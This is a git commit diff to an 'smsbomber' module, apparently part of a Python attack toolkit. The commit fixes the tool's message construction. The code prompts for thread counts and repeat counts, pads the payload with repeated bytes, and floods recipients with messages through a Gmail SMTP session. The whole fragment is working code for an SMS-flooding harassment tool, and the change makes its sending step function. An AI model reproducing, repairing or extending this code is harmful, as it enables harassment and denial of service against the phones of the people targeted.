cbe5c09ad2028ae67309cdc68bf1c6fc13c1fd37
MattPerez <mattrock000@outlook.com>
2015-10-08 21:27:28 -0400

    fixed sending issue.

--- modules/smsbomber/smsbomber.py
+++ modules/smsbomber/smsbomber.py
@@ -75,7 +75,7 @@ def SMSBomb():
     thread_count = raw_input('\t[!] How many threads: ')
     msg_text = '\xd7\x30'*40 + packet*int(thread_count)
     thread_send = raw_input('\t[!] How many times would you like to send the thread: ')
-    thread_sending = ("%s%s%s" % (gmail_username, "" .join(msg_to), "" .join(msg_text)))
+    thread_sending = ("From:%s\rTo:%s\r\r%s" % (gmail_username, "" .join(msg_to), "" .join(msg_text)))
     session = s.SMTP(smtp_server, smtp_port)
     session.ehlo()
     session.starttls()
